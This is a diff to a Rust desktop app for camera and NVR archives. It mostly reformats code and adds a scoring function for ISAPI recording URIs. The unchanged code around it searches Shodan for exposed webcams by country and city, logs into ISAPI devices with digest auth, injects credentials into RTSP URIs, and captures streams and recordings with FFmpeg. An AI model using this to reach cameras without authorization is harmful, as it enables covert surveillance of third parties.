@@ -8,7 +8,7 @@ use chrono::Utc;
 use dotenv::dotenv;
 use futures_util::StreamExt;
 use regex::Regex;
-use serde::{Serialize, Deserialize};
+use serde::{Deserialize, Serialize};
 use serde_json::Value;
 use sha2::{Digest, Sha256};
 use std::collections::{HashMap, HashSet};
@@ -16,8 +16,8 @@ use std::env;
 use std::fs::OpenOptions;
 use std::net::ToSocketAddrs;
 use std::path::PathBuf;
-use std::sync::Arc;
 use std::process::{Command, Stdio};
+use std::sync::Arc;
 mod nexus;
 use suppaftp::FtpStream;
 use tauri::State;
@@ -112,6 +112,62 @@ struct IsapiRecordingItem {
     start_time: Option<String>,
     end_time: Option<String>,
     playback_uri: Option<String>,
+    transport: String,
+    downloadable: bool,
+    playable: bool,
+    confidence: u8,
+}
+
+fn classify_isapi_record(
+    playback_uri: Option<&str>,
+    start_time: Option<&str>,
+    end_time: Option<&str>,
+) -> (String, bool, bool, u8) {
+    let uri = playback_uri.unwrap_or_default().trim().to_lowercase();
+    let has_window = start_time.is_some() && end_time.is_some();
+
+    if uri.is_empty() {
+        let confidence = if has_window { 30 } else { 5 };
+        return ("none".into(), false, has_window, confidence);
+    }
+
+    let transport = if uri.starts_with("rtsp://") {
+        "rtsp"
+    } else if uri.starts_with("https://") {
+        "https"
+    } else if uri.starts_with("http://") {
+        "http"
+    } else {
+        "unknown"
+    };
+
+    let downloadable = matches!(transport, "http" | "https")
+        && (uri.contains("/download") || uri.contains("playbackuri=") || uri.contains("filename="));
+
+    let playable = matches!(transport, "rtsp" | "http" | "https")
+        || uri.contains("rtsp")
+        || uri.contains("playback");
+
+    let mut confidence = 20u8;
+    if has_window {
+        confidence = confidence.saturating_add(20);
+    }
+    if playable {
+        confidence = confidence.saturating_add(25);
+    }
+    if downloadable {
+        confidence = confidence.saturating_add(25);
+    }
+    if transport == "rtsp" || transport == "http" || transport == "https" {
+        confidence = confidence.saturating_add(10);
+    }
+
+    (
+        transport.into(),
+        downloadable,
+        playable,
+        confidence.min(100),
+    )
 }
 
 #[derive(Debug, Serialize)]
@@ -168,7 +224,9 @@ fn parse_archive_duration_from_uri(uri: &str) -> Option<u64> {
         if normalized.len() == 15 && normalized.chars().nth(8) == Some('T') {
             chrono::NaiveDateTime::parse_from_str(&normalized, "%Y%m%dT%H%M%S")
                 .ok()
-                .map(|ndt| chrono::DateTime::<chrono::Utc>::from_naive_utc_and_offset(ndt, chrono::Utc))
+                .map(|ndt| {
+                    chrono::DateTime::<chrono::Utc>::from_naive_utc_and_offset(ndt, chrono::Utc)
+                })
         } else {
             None
         }
@@ -251,7 +309,12 @@ struct DeviceRecord {
     last_seen: i64,
 }
 
-async fn save_device_to_db(device_id: &str, ip: &str, vendor: &str, status: &str) -> Result<(), String> {
+async fn save_device_to_db(
+    device_id: &str,
+    ip: &str,
+    vendor: &str,
+    status: &str,
+) -> Result<(), String> {
     let db = sled::open(get_vault_path().join("devices_db")).map_err(|e| e.to_string())?;
     let key = format!("device:{}", device_id);
     let now = Utc::now().timestamp();
@@ -264,16 +327,23 @@ async fn save_device_to_db(device_id: &str, ip: &str, vendor: &str, status: &str
         last_seen: now,
     };
     let value = serde_json::to_vec(&record).map_err(|e| e.to_string())?;
-    db.insert(key.as_bytes(), value).map_err(|e| e.to_string())?;
+    db.insert(key.as_bytes(), value)
+        .map_err(|e| e.to_string())?;
     Ok(())
 }
 
 // --- ИНТЕГРАЦИЯ SHODAN ---
 // --- ИНТЕГРАЦИЯ SHODAN ---
 #[tauri::command]
-async fn external_search(country: String, city: String, log_state: State<'_, LogState>) -> Result<Vec<Value>, String> {
+async fn external_search(
+    country: String,
+    city: String,
+    log_state: State<'_, LogState>,
+) -> Result<Vec<Value>, String> {
     let api_key = env::var("SHODAN_API_KEY").unwrap_or_default();
-    if api_key.is_empty() { return Err("API ключ Shodan не найден в .env".into()); }
+    if api_key.is_empty() {
+        return Err("API ключ Shodan не найден в .env".into());
+    }
 
     let client = reqwest::Client::new();
     let query = format!("webcam port:80,554 country:{} city:{}", country, city);
@@ -286,7 +356,14 @@ async fn external_search(country: String, city: String, log_state: State<'_, Log
         urlencoding::encode(&query)
     );
 
-    let res: Value = client.get(&url).send().await.map_err(|e| e.to_string())?.json().await.map_err(|e| e.to_string())?;
+    let res: Value = client
+        .get(&url)
+        .send()
+        .await
+        .map_err(|e| e.to_string())?
+        .json()
+        .await
+        .map_err(|e| e.to_string())?;
     let mut results = Vec::new();
 
     if let Some(matches) = res["matches"].as_array() {
@@ -317,7 +394,13 @@ fn start_hub_stream(
     state: State<'_, StreamState>,
     log_state: State<'_, LogState>,
 ) -> Result<String, String> {
-    push_runtime_log(&log_state, format!("Start hub stream: {} (user={}, ch={})", target_id, user_id, channel_id));
+    push_runtime_log(
+        &log_state,
+        format!(
+            "Start hub stream: {} (user={}, ch={})",
+            target_id, user_id, channel_id
+        ),
+    );
     let cache = get_vault_path().join("hls_cache").join(&target_id);
     let _ = std::fs::create_dir_all(&cache);
 
@@ -347,35 +430,57 @@ fn start_hub_stream(
     let child = Command::new(get_vault_path().join("ffmpeg.exe"))
         .args([
             // --- ЗАГОЛОВКИ ---
-            "-headers", &headers,
-            "-user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
+            "-headers",
+            &headers,
+            "-user_agent",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
             // --- БУФЕРЫ И ТАЙМАУТЫ ---
-            "-probesize", "10000000",
-            "-analyzeduration", "10000000",
-            "-use_wallclock_as_timestamps", "1",
+            "-probesize",
+            "10000000",
+            "-analyzeduration",
+            "10000000",
+            "-use_wallclock_as_timestamps",
+            "1",
             // --- РЕКОННЕКТ ---
-            "-reconnect", "1",
-            "-reconnect_at_eof", "1",
-            "-reconnect_streamed", "1",
-            "-reconnect_delay_max", "5",
+            "-reconnect",
+            "1",
+            "-reconnect_at_eof",
+            "1",
+            "-reconnect_streamed",
+            "1",
+            "-reconnect_delay_max",
+            "5",
             // --- ВВОД ---
-            "-f", "mpjpeg",
+            "-f",
+            "mpjpeg",
             "-y",
-            "-i", &url,
+            "-i",
+            &url,
             // --- КОДИРОВАНИЕ ---
-            "-c:v", "libx264",
-            "-preset", "ultrafast",
-            "-tune", "zerolatency",
-            "-crf", "28",
-            "-g", "30",
-            "-sc_threshold", "0",
+            "-c:v",
+            "libx264",
+            "-preset",
+            "ultrafast",
+            "-tune",
+            "zerolatency",
+            "-crf",
+            "28",
+            "-g",
+            "30",
+            "-sc_threshold",
+            "0",
             "-an",
             // --- HLS ---
-            "-f", "hls",
-            "-hls_time", "2",
-            "-hls_list_size", "5",
-            "-hls_flags", "delete_segments+append_list+omit_endlist",
-            "-hls_segment_type", "mpegts",
+            "-f",
+            "hls",
+            "-hls_time",
+            "2",
+            "-hls_list_size",
+            "5",
+            "-hls_flags",
+            "delete_segments+append_list+omit_endlist",
+            "-hls_segment_type",
+            "mpegts",
             playlist.to_str().unwrap(),
         ])
         .stdout(Stdio::null())
@@ -606,7 +711,10 @@ fn start_stream(
     let playlist = cache.join("stream.m3u8");
     let ffmpeg = get_vault_path().join("ffmpeg.exe");
 
-    push_runtime_log(&log_state, format!("HLS target: {}", playlist.to_string_lossy()));
+    push_runtime_log(
+        &log_state,
+        format!("HLS target: {}", playlist.to_string_lossy()),
+    );
     push_runtime_log(&log_state, format!("RTSP source: {}", rtsp_url));
 
     {
@@ -620,21 +728,35 @@ fn start_stream(
     let mut child = Command::new(&ffmpeg)
         .args([
             "-y",
-            "-rtsp_transport", "tcp",
-            "-fflags", "+genpts",
-            "-i", &rtsp_url,
+            "-rtsp_transport",
+            "tcp",
+            "-fflags",
+            "+genpts",
+            "-i",
+            &rtsp_url,
             "-an",
-            "-c:v", "libx264",
-            "-preset", "ultrafast",
-            "-tune", "zerolatency",
-            "-pix_fmt", "yuv420p",
-            "-g", "25",
-            "-sc_threshold", "0",
-            "-f", "hls",
-            "-hls_time", "2",
-            "-hls_list_size", "5",
-            "-hls_flags", "delete_segments+append_list+omit_endlist",
-            "-hls_segment_type", "mpegts",
+            "-c:v",
+            "libx264",
+            "-preset",
+            "ultrafast",
+            "-tune",
+            "zerolatency",
+            "-pix_fmt",
+            "yuv420p",
+            "-g",
+            "25",
+            "-sc_threshold",
+            "0",
+            "-f",
+            "hls",
+            "-hls_time",
+            "2",
+            "-hls_list_size",
+            "5",
+            "-hls_flags",
+            "delete_segments+append_list+omit_endlist",
+            "-hls_segment_type",
+            "mpegts",
             playlist.to_str().unwrap(),
         ])
         .stdout(Stdio::null())
@@ -655,9 +777,18 @@ fn start_stream(
     }
 
     if playlist.exists() {
-        push_runtime_log(&log_state, format!("HLS playlist ready: {}", playlist.to_string_lossy()));
+        push_runtime_log(
+            &log_state,
+            format!("HLS playlist ready: {}", playlist.to_string_lossy()),
+        );
     } else {
-        push_runtime_log(&log_state, format!("FFmpeg жив, но playlist пока не появился: {}", playlist.to_string_lossy()));
+        push_runtime_log(
+            &log_state,
+            format!(
+                "FFmpeg жив, но playlist пока не появился: {}",
+                playlist.to_string_lossy()
+            ),
+        );
     }
 
     state
@@ -671,10 +802,7 @@ fn start_stream(
 
 /// Проверка: жив ли FFmpeg процесс для данного стрима
 #[tauri::command]
-fn check_stream_alive(
-    target_id: String,
-    state: State<'_, StreamState>,
-) -> Result<bool, String> {
+fn check_stream_alive(target_id: String, state: State<'_, StreamState>) -> Result<bool, String> {
     let mut streams = state.active_streams.lock().unwrap();
     if let Some(child) = streams.get_mut(&target_id) {
         match child.try_wait() {
@@ -683,7 +811,7 @@ fn check_stream_alive(
                 streams.remove(&target_id);
                 Ok(false)
             }
-            Ok(None) => Ok(true),     // Ещё работает
+            Ok(None) => Ok(true), // Ещё работает
             Err(_) => Ok(false),
         }
     } else {
@@ -789,7 +917,7 @@ fn inject_rtsp_credentials(uri: &str, login: &str, pass: &str) -> String {
 
     // Находим схему
     let (scheme, rest) = if let Some(idx) = uri.find("://") {
-        (&uri[..idx+3], &uri[idx+3..])
+        (&uri[..idx + 3], &uri[idx + 3..])
     } else {
         return uri.to_string();
     };
@@ -862,7 +990,10 @@ async fn relay_list_files(
         req = req.header("Authorization", format!("Bearer {}", token));
     }
 
-    let resp = req.send().await.map_err(|e| format!("Relay connection error: {}", e))?;
+    let resp = req
+        .send()
+        .await
+        .map_err(|e| format!("Relay connection error: {}", e))?;
 
     if !resp.status().is_success() {
         let status = resp.status();
@@ -871,7 +1002,10 @@ async fn relay_list_files(
     }
 
     let items: Vec<FtpFolder> = resp.json().await.map_err(|e| e.to_string())?;
-    push_runtime_log(&log_state, format!("RELAY list done: {} items", items.len()));
+    push_runtime_log(
+        &log_state,
+        format!("RELAY list done: {} items", items.len()),
+    );
     Ok(items)
 }
 
@@ -887,14 +1021,19 @@ async fn relay_download_file(
     log_state: State<'_, LogState>,
     cancel_state: State<'_, DownloadCancelState>,
 ) -> Result<DownloadReport, String> {
-    let task_key = task_id.unwrap_or_else(|| format!("relay_{}_{}", server_alias, Utc::now().timestamp_millis()));
+    let task_key = task_id
+        .unwrap_or_else(|| format!("relay_{}_{}", server_alias, Utc::now().timestamp_millis()));
     if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
         cancelled.remove(&task_key);
     }
 
-    push_runtime_log(&log_state, format!(
-        "RELAY download: {}/{}/{} [task:{}]", server_alias, folder_path, filename, task_key
-    ));
+    push_runtime_log(
+        &log_state,
+        format!(
+            "RELAY download: {}/{}/{} [task:{}]",
+            server_alias, folder_path, filename, task_key
+        ),
+    );
 
     let client = reqwest::Client::builder()
         .timeout(Duration::from_secs(600)) // 10 мин на большие файлы
@@ -915,7 +1054,10 @@ async fn relay_download_file(
     }
 
     let started = std::time::Instant::now();
-    let resp = req.send().await.map_err(|e| format!("Relay connection error: {}", e))?;
+    let resp = req
+        .send()
+        .await
+        .map_err(|e| format!("Relay connection error: {}", e))?;
 
     if !resp.status().is_success() {
         let body = resp.text().await.unwrap_or_default();
@@ -924,25 +1066,41 @@ async fn relay_download_file(
 
     let total_size = resp.content_length().unwrap_or(0);
     let safe_name = sanitize_filename_component(&filename);
-    let path = get_vault_path()
-        .join("archives")
-        .join(&server_alias)
-        .join(if safe_name.is_empty() { "download.mkv" } else { &safe_name });
+    let path =
+        get_vault_path()
+            .join("archives")
+            .join(&server_alias)
+            .join(if safe_name.is_empty() {
+                "download.mkv"
+            } else {
+                &safe_name
+            });
     let _ = std::fs::create_dir_all(path.parent().unwrap());
 
     let mut stream = resp.bytes_stream();
     let mut file = OpenOptions::new()
-        .create(true).write(true).truncate(true)
-        .open(&path).map_err(|e| e.to_string())?;
+        .create(true)
+        .write(true)
+        .truncate(true)
+        .open(&path)
+        .map_err(|e| e.to_string())?;
 
     let mut bytes_written: u64 = 0;
     let progress_step = 2 * 1024 * 1024u64;
     let mut next_mark = progress_step;
 
     while let Some(chunk) = stream.next().await {
-        if cancel_state.cancelled_tasks.lock().map(|s| s.contains(&task_key)).unwrap_or(false) {
+        if cancel_state
+            .cancelled_tasks
+            .lock()
+            .map(|s| s.contains(&task_key))
+            .unwrap_or(false)
+        {
             let _ = std::fs::remove_file(&path);
-            push_runtime_log(&log_state, format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename));
+            push_runtime_log(
+                &log_state,
+                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
+            );
             return Err(format!("Relay download cancelled [task:{}]", task_key));
         }
 
@@ -951,17 +1109,27 @@ async fn relay_download_file(
         bytes_written += data.len() as u64;
 
         if bytes_written >= next_mark {
-            push_runtime_log(&log_state, format!(
-                "DOWNLOAD_PROGRESS|{}|{}|{}", task_key, bytes_written, total_size.max(bytes_written)
-            ));
+            push_runtime_log(
+                &log_state,
+                format!(
+                    "DOWNLOAD_PROGRESS|{}|{}|{}",
+                    task_key,
+                    bytes_written,
+                    total_size.max(bytes_written)
+                ),
+            );
             next_mark += progress_step;
         }
     }
 
     let duration_ms = started.elapsed().as_millis();
-    push_runtime_log(&log_state, format!(
-        "RELAY download done: {} ({} bytes, {}ms) [task:{}]", filename, bytes_written, duration_ms, task_key
-    ));
+    push_runtime_log(
+        &log_state,
+        format!(
+            "RELAY download done: {} ({} bytes, {}ms) [task:{}]",
+            filename, bytes_written, duration_ms, task_key
+        ),
+    );
 
     Ok(DownloadReport {
         server_alias: server_alias.to_string(),
@@ -977,10 +1145,7 @@ async fn relay_download_file(
 
 /// Проверить что relay доступен
 #[tauri::command]
-async fn relay_ping(
-    relay_url: String,
-    relay_token: Option<String>,
-) -> Result<Value, String> {
+async fn relay_ping(relay_url: String, relay_token: Option<String>) -> Result<Value, String> {
     let client = reqwest::Client::builder()
         .timeout(Duration::from_secs(5))
         .build()
@@ -992,7 +1157,10 @@ async fn relay_ping(
         req = req.header("Authorization", format!("Bearer {}", token));
     }
 
-    let resp = req.send().await.map_err(|e| format!("Relay недоступен: {}", e))?;
+    let resp = req
+        .send()
+        .await
+        .map_err(|e| format!("Relay недоступен: {}", e))?;
     let data: Value = resp.json().await.map_err(|e| e.to_string())?;
     Ok(data)
 }
@@ -1108,7 +1276,10 @@ fn ftp_connect_with_retry(
     let mut last_err = String::new();
 
     for attempt in 1..=max_retries {
-        println!("[FTP ЦМУС] Попытка {}/{} -> {} (Ожидание: {}ms)", attempt, max_retries, host, delay_ms);
+        println!(
+            "[FTP ЦМУС] Попытка {}/{} -> {} (Ожидание: {}ms)",
+            attempt, max_retries, host, delay_ms
+        );
 
         match suppaftp::FtpStream::connect(host) {
             Ok(mut ftp) => {
@@ -1123,14 +1294,20 @@ fn ftp_connect_with_retry(
             }
             Err(e) => {
                 last_err = format!("Ошибка TCP: {}", e);
-                println!("[FTP ЦМУС] Сбой: {}. Переподключение через {}ms", e, delay_ms);
+                println!(
+                    "[FTP ЦМУС] Сбой: {}. Переподключение через {}ms",
+                    e, delay_ms
+                );
                 // Засыпаем и увеличиваем время ожидания в 2 раза (2s, 4s, 8s)
                 std::thread::sleep(std::time::Duration::from_millis(delay_ms));
                 delay_ms *= 2;
             }
         }
     }
-    Err(format!("Превышен лимит попыток. Последняя ошибка: {}", last_err))
+    Err(format!(
+        "Превышен лимит попыток. Последняя ошибка: {}",
+        last_err
+    ))
 }
 
 fn ftp_nlst_root_with_fallback(ftp: &mut FtpStream) -> Result<Vec<String>, String> {
@@ -1187,7 +1364,10 @@ fn get_ftp_folders(
     folder_path: Option<String>,
     log_state: State<'_, LogState>,
 ) -> Result<Vec<FtpFolder>, String> {
-    push_runtime_log(&log_state, format!("FTP list requested for server {}", server_alias));
+    push_runtime_log(
+        &log_state,
+        format!("FTP list requested for server {}", server_alias),
+    );
 
     let cfg = resolve_ftp_config(server_alias)?;
 
@@ -1197,7 +1377,10 @@ fn get_ftp_folders(
     let current_path = folder_path.unwrap_or_else(|| "/".to_string());
     if current_path != "/" && !current_path.is_empty() {
         if let Err(e) = ftp.cwd(&current_path) {
-            push_runtime_log(&log_state, format!("FTP cwd failed to {}: {}", current_path, e));
+            push_runtime_log(
+                &log_state,
+                format!("FTP cwd failed to {}: {}", current_path, e),
+            );
         }
     }
 
@@ -1206,7 +1389,10 @@ fn get_ftp_folders(
 
     // Попытка 1: Пассивный режим
     ftp.set_mode(suppaftp::Mode::Passive);
-    push_runtime_log(&log_state, "Пробуем Пассивный (Passive) режим...".to_string());
+    push_runtime_log(
+        &log_state,
+        "Пробуем Пассивный (Passive) режим...".to_string(),
+    );
 
     match ftp_nlst_root_with_fallback(&mut ftp) {
         Ok(items) => {
@@ -1214,18 +1400,27 @@ fn get_ftp_folders(
             list_result = Ok(items);
         }
         Err(e) => {
-            push_runtime_log(&log_state, format!("Пассивный режим заблокирован: {}. Пробуем Active...", e));
+            push_runtime_log(
+                &log_state,
+                format!("Пассивный режим заблокирован: {}. Пробуем Active...", e),
+            );
 
             // Попытка 2: Активный режим (Fallback)
             ftp.set_mode(suppaftp::Mode::Active);
 
             match ftp_nlst_root_with_fallback(&mut ftp) {
                 Ok(items) => {
-                    push_runtime_log(&log_state, "Активный режим успешно пробил файрвол!".to_string());
+                    push_runtime_log(
+                        &log_state,
+                        "Активный режим успешно пробил файрвол!".to_string(),
+                    );
                     list_result = Ok(items);
                 }
                 Err(e_act) => {
-                    list_result = Err(format!("Оба режима отклонены сервером. Passive: {}, Active: {}", e, e_act));
+                    list_result = Err(format!(
+                        "Оба режима отклонены сервером. Passive: {}, Active: {}",
+                        e, e_act
+                    ));
                 }
             }
         }
@@ -1240,18 +1435,26 @@ fn get_ftp_folders(
             continue;
         }
 
-        let is_file = name.contains('.') && name.rfind('.').unwrap_or(0) > name.len().saturating_sub(6);
+        let is_file =
+            name.contains('.') && name.rfind('.').unwrap_or(0) > name.len().saturating_sub(6);
         let full_path = if current_path.ends_with('/') {
             format!("{}{}", current_path, name)
         } else {
             format!("{}/{}", current_path, name)
         };
 
-        folders.push(FtpFolder { name, path: full_path, is_file });
+        folders.push(FtpFolder {
+            name,
+            path: full_path,
+            is_file,
+        });
     }
 
     let _ = ftp.quit();
-    push_runtime_log(&log_state, format!("FTP list completed ({} entries)", folders.len()));
+    push_runtime_log(
+        &log_state,
+        format!("FTP list completed ({} entries)", folders.len()),
+    );
     Ok(folders)
 }
 
@@ -1782,7 +1985,10 @@ async fn fetch_nvr_device_info(
             client
                 .get(&endpoint)
                 .header("X-Requested-With", "XMLHttpRequest")
-                .header("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)")
+                .header(
+                    "User-Agent",
+                    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
+                )
                 .header("Accept", "application/xml, text/xml, */*")
                 .send()
                 .await
@@ -1800,11 +2006,17 @@ async fn fetch_nvr_device_info(
 
                 // Если 401 на порту 2019 — делаем Digest auth
                 if status_code == 401 && is_2019 {
-                    if let Some(www_auth) = r.headers().get(reqwest::header::WWW_AUTHENTICATE).and_then(|h| h.to_str().ok()).map(|s| s.to_string()) {
+                    if let Some(www_auth) = r
+                        .headers()
+                        .get(reqwest::header::WWW_AUTHENTICATE)
+                        .and_then(|h| h.to_str().ok())
+                        .map(|s| s.to_string())
+                    {
                         let _ = r.text().await; // consume body
                         let path = "/ISAPI/System/deviceInfo";
                         if let Ok(mut prompt) = digest_auth::parse(&www_auth) {
-                            let ctx = digest_auth::AuthContext::new(login.clone(), pass.clone(), path);
+                            let ctx =
+                                digest_auth::AuthContext::new(login.clone(), pass.clone(), path);
                             if let Ok(answer) = prompt.respond(&ctx) {
                                 let resp2 = client.get(&endpoint)
                                     .header("Authorization", answer.to_string())
@@ -1816,8 +2028,18 @@ async fn fetch_nvr_device_info(
                                     let text2 = r2.text().await.unwrap_or_default();
                                     if sc2 == 200 {
                                         let preview = text2.chars().take(600).collect::<String>();
-                                        push_runtime_log(&log_state, format!("ISAPI deviceInfo (Digest) {} from {}", sc2, endpoint));
-                                        return Ok(NvrDeviceInfoResult { endpoint, status: sc2.to_string(), body_preview: preview });
+                                        push_runtime_log(
+                                            &log_state,
+                                            format!(
+                                                "ISAPI deviceInfo (Digest) {} from {}",
+                                                sc2, endpoint
+                                            ),
+                                        );
+                                        return Ok(NvrDeviceInfoResult {
+                                            endpoint,
+                                            status: sc2.to_string(),
+                                            body_preview: preview,
+                                        });
                                     }
                                 }
                             }
@@ -1969,7 +2191,10 @@ async fn search_isapi_recordings(
 
     push_runtime_log(
         &log_state,
-        format!("ISAPI search started for {} [{} - {}]", clean_host, from, to),
+        format!(
+            "ISAPI search started for {} [{} - {}]",
+            clean_host, from, to
+        ),
     );
 
     let start_re = Regex::new(r"<startTime>([^<]+)</startTime>").map_err(|e| e.to_string())?;
@@ -2112,7 +2337,11 @@ async fn search_isapi_recordings(
                                                         variant_name, tid, code, t.len()
                                                     ),
                                                 );
-                                                if code == 200 { Some(t) } else { None }
+                                                if code == 200 {
+                                                    Some(t)
+                                                } else {
+                                                    None
+                                                }
                                             }
                                             Err(e) => {
                                                 push_runtime_log(
@@ -2146,7 +2375,10 @@ async fn search_isapi_recordings(
                                 &log_state,
                                 format!(
                                     "ISAPI search :2019 variant={} tid={} → HTTP {} ({} chars)",
-                                    variant_name, tid, code, t.len()
+                                    variant_name,
+                                    tid,
+                                    code,
+                                    t.len()
                                 ),
                             );
                             None
@@ -2182,7 +2414,11 @@ async fn search_isapi_recordings(
                                     variant_name, tid, code, t.len()
                                 ),
                             );
-                            if code == 200 { Some(t) } else { None }
+                            if code == 200 {
+                                Some(t)
+                            } else {
+                                None
+                            }
                         }
                         Err(e) => {
                             push_runtime_log(
@@ -2250,20 +2486,44 @@ async fn search_isapi_recordings(
 
                     let mut items = Vec::with_capacity(count);
                     for i in 0..count {
+                        let start_time = starts.get(i).cloned();
+                        let end_time = ends.get(i).cloned();
+                        let playback_uri = uris.get(i).cloned();
+                        let (transport, downloadable, playable, confidence) = classify_isapi_record(
+                            playback_uri.as_deref(),
+                            start_time.as_deref(),
+                            end_time.as_deref(),
+                        );
+
                         items.push(IsapiRecordingItem {
                             endpoint: endpoint.clone(),
                             track_id: tracks.get(i).cloned().or_else(|| Some(tid.to_string())),
-                            start_time: starts.get(i).cloned(),
-                            end_time: ends.get(i).cloned(),
-                            playback_uri: uris.get(i).cloned(),
+                            start_time,
+                            end_time,
+                            playback_uri,
+                            transport,
+                            downloadable,
+                            playable,
+                            confidence,
                         });
                     }
+
+                    let downloadable_count = items.iter().filter(|x| x.downloadable).count();
+                    let playable_count = items.iter().filter(|x| x.playable).count();
+                    let max_confidence = items.iter().map(|x| x.confidence).max().unwrap_or(0);
 
                     push_runtime_log(
                         &log_state,
                         format!(
-                            "ISAPI search finished for {} via {} | tid={} | variant={} | items={}",
-                            clean_host, endpoint, tid, variant_name, items.len()
+                            "ISAPI search finished for {} via {} | tid={} | variant={} | items={} | playable={} | downloadable={} | max_conf={}",
+                            clean_host,
+                            endpoint,
+                            tid,
+                            variant_name,
+                            items.len(),
+                            playable_count,
+                            downloadable_count,
+                            max_confidence
                         ),
                     );
 
@@ -2868,10 +3128,7 @@ async fn download_isapi_playback_uri(
     let task_key = task_id.unwrap_or_else(|| format!("isapi_{}", Utc::now().timestamp_millis()));
     push_runtime_log(
         &log_state,
-        format!(
-            "ISAPI download requested: {} [task:{}]",
-            uri, task_key
-        ),
+        format!("ISAPI download requested: {} [task:{}]", uri, task_key),
     );
 
     if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
@@ -2886,27 +3143,66 @@ async fn download_isapi_playback_uri(
         // === ВЕТКА RTSP: FFmpeg capture ===
         push_runtime_log(
             &log_state,
-            format!("ISAPI transport: RTSP detected → FFmpeg capture [task:{}]", task_key),
+            format!(
+                "ISAPI transport: RTSP detected → FFmpeg capture [task:{}]",
+                task_key
+            ),
         );
-        return download_isapi_via_rtsp(&uri, &login, &pass, filename_hint, &task_key, &log_state, &cancel_state, &ffmpeg_limiter).await;
+        return download_isapi_via_rtsp(
+            &uri,
+            &login,
+            &pass,
+            filename_hint,
+            &task_key,
+            &log_state,
+            &cancel_state,
+            &ffmpeg_limiter,
+        )
+        .await;
     }
 
     if uri_lc.starts_with("http://") || uri_lc.starts_with("https://") {
         // === ВЕТКА HTTP: reqwest download ===
         push_runtime_log(
             &log_state,
-            format!("ISAPI transport: HTTP detected → reqwest download [task:{}]", task_key),
+            format!(
+                "ISAPI transport: HTTP detected → reqwest download [task:{}]",
+                task_key
+            ),
         );
-        return download_isapi_via_http(&uri, &login, &pass, filename_hint, &task_key, &log_state, &cancel_state).await;
+        return download_isapi_via_http(
+            &uri,
+            &login,
+            &pass,
+            filename_hint,
+            &task_key,
+            &log_state,
+            &cancel_state,
+        )
+        .await;
     }
 
     // === ВЕТКА UNKNOWN ===
     // Если URI не распознан — попробуем через FFmpeg (он поддерживает много протоколов)
     push_runtime_log(
         &log_state,
-        format!("ISAPI transport: unknown scheme '{}' → trying FFmpeg [task:{}]", uri.chars().take(30).collect::<String>(), task_key),
+        format!(
+            "ISAPI transport: unknown scheme '{}' → trying FFmpeg [task:{}]",
+            uri.chars().take(30).collect::<String>(),
+            task_key
+        ),
     );
-    download_isapi_via_rtsp(&uri, &login, &pass, filename_hint, &task_key, &log_state, &cancel_state, &ffmpeg_limiter).await
+    download_isapi_via_rtsp(
+        &uri,
+        &login,
+        &pass,
+        filename_hint,
+        &task_key,
+        &log_state,
+        &cancel_state,
+        &ffmpeg_limiter,
+    )
+    .await
 }
 
 #[tauri::command]
@@ -2943,7 +3239,8 @@ async fn start_archive_export_job(
         log_state.clone(),
         cancel_state.clone(),
         ffmpeg_limiter.clone(),
-    ).await;
+    )
+    .await;
 
     match direct_result {
         Ok(report) => {
@@ -2954,7 +3251,10 @@ async fn start_archive_export_job(
                 save_path: Some(report.save_path.clone()),
                 bytes_written: Some(report.bytes_written),
             });
-            push_runtime_log(&log_state, format!("ARCHIVE_EXPORT|{}|stage=direct|status=done", task_key));
+            push_runtime_log(
+                &log_state,
+                format!("ARCHIVE_EXPORT|{}|stage=direct|status=done", task_key),
+            );
             return Ok(ArchiveExportJobResult {
                 task_id: task_key,
                 final_status: "done".into(),
@@ -2978,7 +3278,10 @@ async fn start_archive_export_job(
             });
             push_runtime_log(
                 &log_state,
-                format!("ARCHIVE_EXPORT|{}|stage=direct|status=failed|reason={}", task_key, err),
+                format!(
+                    "ARCHIVE_EXPORT|{}|stage=direct|status=failed|reason={}",
+                    task_key, err
+                ),
             );
         }
     }
@@ -2996,7 +3299,8 @@ async fn start_archive_export_job(
         log_state.clone(),
         cancel_state.clone(),
         ffmpeg_limiter.clone(),
-    ).await;
+    )
+    .await;
 
     match fallback_result {
         Ok(report) => {
@@ -3007,7 +3311,10 @@ async fn start_archive_export_job(
                 save_path: Some(report.save_path.clone()),
                 bytes_written: Some(report.bytes_written),
             });
-            push_runtime_log(&log_state, format!("ARCHIVE_EXPORT|{}|stage=ffmpeg|status=done", task_key));
+            push_runtime_log(
+                &log_state,
+                format!("ARCHIVE_EXPORT|{}|stage=ffmpeg|status=done", task_key),
+            );
             Ok(ArchiveExportJobResult {
                 task_id: task_key,
                 final_status: "done".into(),
@@ -3030,7 +3337,10 @@ async fn start_archive_export_job(
             });
             push_runtime_log(
                 &log_state,
-                format!("ARCHIVE_EXPORT|{}|stage=ffmpeg|status=failed|reason={}", task_key, err),
+                format!(
+                    "ARCHIVE_EXPORT|{}|stage=ffmpeg|status=failed|reason={}",
+                    task_key, err
+                ),
             );
 
             let final_reason = match direct_failure_reason {
@@ -3053,11 +3363,12 @@ async fn start_archive_export_job(
     }
 }
 
-
 /// RTSP ветка: скачивание через FFmpeg capture
 /// Инжектит login:pass в RTSP URI и запускает FFmpeg
 async fn download_isapi_via_rtsp(
-    uri: &str, login: &str, pass: &str,
+    uri: &str,
+    login: &str,
+    pass: &str,
     filename_hint: Option<String>,
     task_key: &str,
     log_state: &State<'_, LogState>,
@@ -3094,7 +3405,12 @@ async fn download_isapi_via_rtsp(
 
     push_runtime_log(
         log_state,
-        format!("RTSP capture: {} → {} [task:{}]", &authed_uri.chars().take(80).collect::<String>(), filename, task_key),
+        format!(
+            "RTSP capture: {} → {} [task:{}]",
+            &authed_uri.chars().take(80).collect::<String>(),
+            filename,
+            task_key
+        ),
     );
 
     let ffmpeg = get_vault_path().join("ffmpeg.exe");
@@ -3108,13 +3424,20 @@ async fn download_isapi_via_rtsp(
     let mut child = Command::new(&ffmpeg)
         .args([
             "-y",
-            "-rtsp_transport", "tcp",
-            "-timeout", "15000000",
-            "-stimeout", "15000000",
-            "-i", &authed_uri,
-            "-t", &duration_limit.to_string(),
-            "-c", "copy",
